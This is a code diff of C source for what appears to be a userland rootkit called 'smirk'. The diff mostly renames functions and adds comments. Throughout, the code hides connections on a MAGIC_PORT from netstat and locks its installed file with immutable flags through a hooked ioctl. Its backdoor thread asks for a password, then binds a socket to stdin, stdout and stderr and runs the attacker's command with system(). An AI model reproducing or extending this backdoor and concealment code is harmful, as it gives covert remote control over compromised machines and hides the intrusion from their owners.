@@ -56,9 +56,8 @@ int is_net_file(const char *pathname){
 /*
  * Function:  fake_netstat
  * --------------------
- * creates a fakenetstat file given the original purging it from MAGIC_PORT
+ * creates a fakenetstat file given the original and purging it from MAGIC_PORT
  *
- *  f: function point to fopen or fopen64
  *  pathname: full the path name
  *  newfile: file pointer to new filename string that will be filled
  *
@@ -130,48 +129,74 @@ void install(){
         fflush(fw);
         unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
         int fd = fileno(fw);
-        fchmod(fd, );
+        // fchmod(fd, );
         hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
         fclose(fw);
     }
 }
 
+/*
+ * Function:  uninstal
+ * --------------------
+ * unistall smirk from system
+ *
+ *  returns: nothing 
+ */
 void uninstall(){
     unlink(MAGIC_LIBPATH);
 }
 
-void spawn_shell(int fd, char *cmd){
-    dup2(fd, 0); //stdin
-    dup2(fd, 1); //stdout
-    dup2(fd, 2); //stderr
-
-    system(cmd);
-}
-
-void readline(int fd, char *buff, int size){
+/*
+ * Function:  read_line
+ * --------------------
+ * given the socket fd the function store in buffer the string of max size bytes
+ *
+ *  fd: the file descriptor
+ *  buffer: pointer to the buffer to store the string
+ *  max_size: max size of the buffer
+ *
+ *  returns: nothing
+ */
+void read_line(int fd, char *buffer, int max_size){
     int l = 0;
     int c = 'X';
-    while (c && c != '\n' && l < size){
+    while (c && c != '\n' && l < max_size){
         read(fd, &c, 1);
-        buff[l] = c;
+        buffer[l] = c;
         l++;
     }
-    buff[l-1] = '\0';
+    buffer[l-1] = '\0';
 }
 
+/*
+ * Function:  backdoor
+ * --------------------
+ * given the socket it spawn a shell with a password request
+ *
+ *  args: the pointer to the socket
+ *
+ *  returns: nothing
+ */
 void *backdoor(void *args){
     int fd = *((int *) args);
+    // get password
     write(fd, "PASS>", 5);
     char buff[1024];
-    readline(fd, buff, sizeof(buff));
+    read_line(fd, buff, sizeof(buff));
     if (strcmp(buff, PASSWORD) != 0){
         char lovephrase[] = "Fuck off.\n";
         write(fd, lovephrase, sizeof(lovephrase));
         close(fd);
         return NULL;
     }
+
+    // manage shell
     write(fd,"CMD>",4);
-    readline(fd, buff, sizeof(buff));
-    spawn_shell(fd, buff);
+    read_line(fd, buff, sizeof(buff));
+    dup2(fd, 0); //stdin
+    dup2(fd, 1); //stdout
+    dup2(fd, 2); //stderr
+
+    system(buff);
     close(fd);
 }
